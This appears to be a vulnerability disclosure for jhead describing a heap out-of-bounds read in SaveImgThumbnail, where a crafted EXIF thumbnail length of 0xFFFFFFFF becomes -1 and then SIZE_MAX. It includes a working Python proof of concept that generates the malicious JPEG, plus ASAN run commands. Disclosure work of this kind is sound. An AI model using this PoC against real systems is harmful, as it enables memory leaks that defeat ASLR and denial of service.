## Bug0: SaveImgThumbnail Heap OOB Read via Negative ThumbnailSize Sign Error

In `SaveImgThumbnail()` in `imgfile.c`, the `ImageInfo.ThumbnailSize` field (declared as `int`) is assigned the value `-1` from a crafted EXIF `TAG_THUMBNAIL_LENGTH` of `0xFFFFFFFF` because the signed bounds check at `exif.c:982` and the zero guard at `imgfile.c:334` both fail to reject the negative value, and the subsequent `fwrite` at `imgfile.c:365` silently converts `-1` to `SIZE_MAX` as a `size_t` argument, producing a massive heap out-of-bounds read.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

OUT_FILE = "poc_input.jpg"

TAG_IMAGE_WIDTH      = 0x0100
TAG_THUMBNAIL_OFFSET = 0x0201
TAG_THUMBNAIL_LENGTH = 0x0202
FMT_ULONG            = 4

IFD0_OFFSET      = 8
IFD0_NUM_ENTRIES = 1
IFD1_OFFSET      = IFD0_OFFSET + 2 + IFD0_NUM_ENTRIES * 12 + 4  # = 26

THUMBNAIL_OFFSET_VALUE = 8
THUMBNAIL_LENGTH_VALUE = 0xFFFFFFFF

def ifd_entry(tag, fmt, count, value):
    return struct.pack('<HHII', tag, fmt, count, value)

# TIFF header (little-endian)
tiff  = struct.pack('<2sHI', b'II', 42, IFD0_OFFSET)
# IFD0
tiff += struct.pack('<H', IFD0_NUM_ENTRIES)
tiff += ifd_entry(TAG_IMAGE_WIDTH, FMT_ULONG, 1, 100)
tiff += struct.pack('<I', IFD1_OFFSET)
# IFD1
tiff += struct.pack('<H', 2)
tiff += ifd_entry(TAG_THUMBNAIL_OFFSET, FMT_ULONG, 1, THUMBNAIL_OFFSET_VALUE)
tiff += ifd_entry(TAG_THUMBNAIL_LENGTH, FMT_ULONG, 1, THUMBNAIL_LENGTH_VALUE)
tiff += struct.pack('<I', 0)

exif_magic  = b'Exif\x00\x00'
app1_body   = exif_magic + tiff
app1_length = 2 + len(app1_body)
app1        = b'\xFF\xE1' + struct.pack('>H', app1_length) + app1_body

sos_header      = b'\x01\x01\x00\x00\x3F\x00'
sos_length      = 2 + len(sos_header)
sos             = b'\xFF\xDA' + struct.pack('>H', sos_length) + sos_header
compressed_stub = b'\x00' * 16

jpeg = b'\xFF\xD8' + app1 + sos + compressed_stub + b'\xFF\xD9'

with open(OUT_FILE, 'wb') as f:
    f.write(jpeg)

print(f"[+] Written {len(jpeg)} bytes to {OUT_FILE}")
print(f"    TAG_THUMBNAIL_LENGTH = 0x{THUMBNAIL_LENGTH_VALUE:x} -> signed int -1 -> size_t SIZE_MAX")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead -st poc_thumb.jpg poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** runtime error: left shift of negative value -1 (exif.c:344, triggered while reading crafted TAG_THUMBNAIL_LENGTH = 0xFFFFFFFF through Get32s). SaveImgThumbnail is called with ThumbnailSize = -1 and executes fwrite(ThumbnailPointer, SIZE_MAX, 1, file), confirmed by the output line "Created: 'poc_thumb.jpg'" appearing after the UBSan error.

### Impact

An attacker who supplies a crafted JPEG file with a malicious `TAG_THUMBNAIL_LENGTH` value of `0xFFFFFFFF` in the EXIF IFD1 can cause `fwrite` in `SaveImgThumbnail()` to request a read of `SIZE_MAX` bytes from the heap, constituting an unbounded heap out-of-bounds read that exposes all readable heap memory (including heap pointers, function pointers, and sensitive in-memory data) to the output thumbnail file and can be used to defeat ASLR. The vulnerability is triggered by any invocation of `jhead -st` on an untrusted JPEG file, making it exploitable whenever jhead processes attacker-controlled input, with a denial-of-service crash (SIGSEGV on unmapped pages) as an additional consequence on platforms where the glibc SIZE_MAX ssize_t conversion does not silently suppress the write.
